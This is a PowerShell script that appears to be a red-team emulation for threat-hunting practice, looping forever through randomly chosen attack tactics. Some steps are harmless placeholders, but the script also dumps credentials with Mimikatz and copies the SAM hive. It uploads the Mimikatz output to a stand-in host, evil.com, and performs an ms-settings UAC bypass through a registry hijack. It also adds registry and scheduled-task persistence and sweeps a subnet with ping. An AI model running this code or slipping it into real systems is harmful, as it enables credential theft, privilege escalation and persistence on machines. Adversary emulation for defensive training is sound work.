# CombinedRedTeamEmulation.ps1

function Invoke-BasicTactics {
    # Mimic C2 traffic
    Invoke-WebRequest -Uri "http://example.com" -UseBasicParsing -Method GET
    # Create a persistence mechanism via registry
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FakeUpdater" -Value "C:\Windows\System32\calc.exe"
    # Generate a suspicious file in the temp directory
    Set-Content -Path "$env:TEMP\malicious_payload.txt" -Value "This is a fake malicious payload for threat hunting practice."
    # Attempt to dump SAM database
    $SAMLocation = "C:\Windows\System32\config\SAM"
    $BackupLocation = "$env:TEMP\SAM_backup"
    Copy-Item -Path $SAMLocation -Destination $BackupLocation -ErrorAction SilentlyContinue
}

function Invoke-AdvancedTactics {
    # Memory-resident malicious script
    $maliciousPayload = {
        Write-Output "This would be a memory resident malicious payload."
    }
    Invoke-Command -ScriptBlock $maliciousPayload
    # Lateral movement emulation by pinging other hosts
    1..5 | ForEach-Object {
        $ip = "192.168.1.$_"
        ping $ip -n 1
    }
    # Attempting to gather credentials from memory using Mimikatz
    $mimikatzPath = "C:\path\to\mimikatz.exe"
    $mimikatzOutput = & $mimikatzPath "privilege::debug" "sekurlsa::logonpasswords" "exit"
    $mimikatzOutput | Out-File -Path "$env:TEMP\mimikatz_output.txt"
    # Emulate data exfiltration
    Invoke-WebRequest -Uri "http://evil.com/upload" -Method POST -InFile "$env:TEMP\mimikatz_output.txt" -UseBasicParsing
    # Attempting UAC bypass
    $hijackPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    New-Item -Path $hijackPath -Force
    Set-ItemProperty -Path $hijackPath -Name "DelegateExecute" -Value ""
    Set-ItemProperty -Path $hijackPath -Name "(default)" -Value "powershell.exe -Command Start-Process 'cmd.exe' -Verb runAs"
    Start-Process -FilePath "ms-settings:"
}

function Invoke-Discovery {
    netstat -an
    net user /domain
}

function Invoke-Evasion {
    Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 600)
    Invoke-WebRequest -Uri "http://example.com/signal" -UseBasicParsing -Method GET
}

function Invoke-Persistence {
    $action = New-ScheduledTaskAction -Execute 'powershell' -Argument "-Command `"`"echo 'Persisted Task Ran'`"`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PersistedTask" -Description "Test Persistence"
}

function Invoke-Exfiltration {
    Compress-Archive -Path "$env:TEMP\malicious_payload.txt" -DestinationPath "$env:TEMP\compressed_payload.zip"
    Invoke-WebRequest -Uri "http://evil.com/upload" -Method POST -InFile "$env:TEMP\compressed_payload.zip" -UseBasicParsing
}

function Invoke-RedTeamTactics {
    $tactics = @('Basic', 'Advanced', 'Discovery', 'Evasion', 'Persistence', 'Exfiltration')
    $selectedTactic = $tactics | Get-Random

    switch ($selectedTactic) {
        'Basic' { Invoke-BasicTactics }
        'Advanced' { Invoke-AdvancedTactics }
        'Discovery' { Invoke-Discovery }
        'Evasion' { Invoke-Evasion }
        'Persistence' { Invoke-Persistence }
        'Exfiltration' { Invoke-Exfiltration }
    }
}

# Repeatedly invoke tactics at random intervals
while ($true) {
    Invoke-RedTeamTactics
    $randomSleepTime = Get-Random -Minimum 60 -Maximum 600  # Sleep between 1 and 10 minutes
    Start-Sleep -Seconds $randomSleepTime
}
